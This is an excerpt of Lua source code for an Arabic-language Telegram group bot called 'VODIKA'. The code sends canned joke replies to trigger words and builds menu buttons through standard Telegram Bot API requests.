end
...
send(msg.chat_id_,msg.id_, 'عندو كام سنه ..😹💥')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, 'معلشش..🌚💕')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, 'يهقرر ..🌚💕')
return false
end
end
end
...
{
{text = ' S A D', url="t.me/A_F_fwdka1"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if text == "وه" or text == "ووه" or text == "وهه" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"يولا يلعيبب 🥴🤸"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "تعالي الكول" or text == "تع الكول" or text == "تعالي كول" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"م فضي والله يعسل 🐾🏋️"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "تعالي  في حوار" or text == "تع البار" or text == "تع هناك" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"م فضي والله يعسل 🐾🏋️"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"يابا دا اقل من انك ترد عليه","مش بنيجي عل حريم يعم","فكك منه م يستاهلش","احظره واريخ دماغي؟!! "}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
{
{text = '𝐒𝐔𝐎𝐔𝐑𝐂𝐄 𝐒??𝐃', url="t.me/A_F_fwdka1"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
{{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
{{text = 'Source VODIKA ', url="t.me/ch_nasa"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/sofi' then
...
local Teext =[[
✧بك في مميزات سورس فودكا
√🥺🌝
✧مميزات الخاصه بسورس✧
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'غنيلي', url="https://t.me/S_5A_D/11"}},
{{text = 'نسبه جمالي', url="https://t.me/S_5A_D/26"},{text = 'اليتيوب', url="https://t.me/S_5A_D/26"}},
{{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
{{text = 'Source VODIKA ', url="t.me/A_F_fwdka1"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فودكا')
